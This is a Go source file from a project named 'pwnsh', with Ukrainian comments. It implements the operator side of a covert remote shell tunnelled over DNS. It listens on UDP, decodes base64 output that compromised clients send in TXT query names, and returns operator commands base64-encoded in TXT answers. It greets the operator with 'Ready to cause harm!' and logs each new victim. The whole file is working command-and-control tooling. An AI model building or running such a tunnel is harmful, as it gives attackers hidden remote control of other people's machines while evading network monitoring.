/*
 * Автор: Андрій Дунай
 * Цей файл є частиною проєкту "pwnsh"
 * 6 червня 2024
 * Ліцензія: WTFPL
 *
 *           DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
 *                   Version 2, December 2004
 *
 *  Copyright (C) 2004 Sam Hocevar <sam@hocevar.net>
 *
 *  Everyone is permitted to copy and distribute verbatim or modified
 *  copies of this license document, and changing it is allowed as long
 *  as the name is changed.
 *
 *           DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
 *  TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION
 *
 *  0. You just DO WHAT THE FUCK YOU WANT TO.
 */

package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"os"
	"strings"

	"golang.org/x/net/dns/dnsmessage"
)

var clients = make(map[string]bool)

func base64mEncode(str string) string {
	str = base64.StdEncoding.EncodeToString([]byte(str))
	// Replace + and / with _ and -
	str = strings.Replace(str, "+", "_", -1)
	str = strings.Replace(str, "/", "-", -1)
	return str
}

func base64mDecode(str string) (string, error) {
	str = strings.Replace(str, "_", "+", -1)
	str = strings.Replace(str, "-", "/", -1)
	decodedStr, err := base64.StdEncoding.DecodeString(str)
	if err != nil {
		return "", err
	}
	// Replace _ and - with + and /
	return string(decodedStr), nil
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: go run . <bind_address>")
		os.Exit(1)
	}

	// Create a UDP server
	addr, err := net.ResolveUDPAddr("udp", os.Args[1])
	if err != nil {
		fmt.Println("main: resolve addr failed: ", err)
		os.Exit(1)
	}

	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		fmt.Println("main: listen failed: ", err)
		os.Exit(1)
	}
	defer conn.Close()

	recvChan := make(chan string, 512)
	sendChan := make(chan string, 512)

	stop := make(chan struct{})
	go handleDNSQueries(conn, stop, recvChan, sendChan)

	fmt.Println("Готовий до нанесення шкоди!")
	fmt.Println("Введіть 'exit' або 'quit' для завершення.")

	// Create stdin reader channel

	reader := newReader(os.Stdin)

	for {
		// fmt.Scanln(&input)
		// Poll stdin and recvChan
		// if input == "exit" || input == "quit" {
		// 	break
		// }
		// sendChan <- input

		select {
		case received := <-recvChan:
			// fmt.Println("Received:", received)
			fmt.Print(received)
		case input := <-reader:
			// fmt.Println("Sending:", input)
			sendChan <- input
		default:
		}
	}
}

func newReader(r io.Reader) <-chan string {
	lines := make(chan string)
	go func() {
		defer close(lines)
		scan := bufio.NewScanner(r)
		for scan.Scan() {
			lines <- scan.Text()
		}
	}()
	return lines
}

func handleDNSQueries(conn *net.UDPConn, stop chan struct{}, recvChan chan<- string, sendChan <-chan string) {
	for {
		buf := make([]byte, 512)
		n, addr, err := conn.ReadFromUDP(buf)
		if err != nil {
			fmt.Println("handleDNSQueries: read failed: ", err)
			continue
		}

		// Is client already connected?
		if _, ok := clients[addr.IP.String()]; !ok {
			fmt.Println("Опа, маємо клієнта:", addr.IP.String())
		}
		clients[addr.IP.String()] = true

		// fmt.Println("handleDNSQueries: received query")

		msg := dnsmessage.Message{}
		err = msg.Unpack(buf[:n])
		if err != nil {
			fmt.Println("handleDNSQueries: unpack failed: ", err)
			continue
		}

		if len(msg.Questions) == 0 {
			fmt.Println("handleDNSQueries: no questions in the message")
			continue
		}

		question := msg.Questions[0]
		if question.Type != dnsmessage.TypeTXT {
			fmt.Println("handleDNSQueries: unsupported query type")
			continue
		}

		// fmt.Println("handleDNSQueries: query:", question.Name.String())

		// Strip trailing dots from question
		query := question.Name.String()
		if query[len(query)-1] == '.' {
			query = query[:len(query)-1]
		}
		// Decode base64 string
		decodedStr, err := base64mDecode(query)
		if err != nil {
			fmt.Println("handleDNSQueries: decode failed: ", err)
			continue
		}

		recvChan <- string(decodedStr)

		// Check if there is any message to send
		var encodedStr string = ""
		select {
		case msg := <-sendChan:
			encodedStr = base64mEncode(msg)
		default:
		}

		// Create a response message
		resp := dnsmessage.Message{
			Header: dnsmessage.Header{
				ID:       msg.Header.ID,
				Response: true,
				// Opcode:   msg.Header.Opcode,
				RCode: dnsmessage.RCodeSuccess,
			},
			Questions: []dnsmessage.Question{question},
			Answers: []dnsmessage.Resource{
				{
					Header: dnsmessage.ResourceHeader{
						Name:  question.Name,
						Type:  dnsmessage.TypeTXT,
						Class: dnsmessage.ClassINET,
					},
					Body: &dnsmessage.TXTResource{
						TXT: []string{encodedStr},
					},
				},
			},
		}

		respBuf, err := resp.Pack()
		if err != nil {
			fmt.Println("handleDNSQueries: pack failed: ", err)
			continue
		}

		_, err = conn.WriteToUDP(respBuf, addr)
		if err != nil {
			fmt.Println("handleDNSQueries: write failed: ", err)
			continue
		}

		// fmt.Println("handleDNSQueries: response sent")

		select {
		case <-stop:
			return
		default:
		}
	}
}
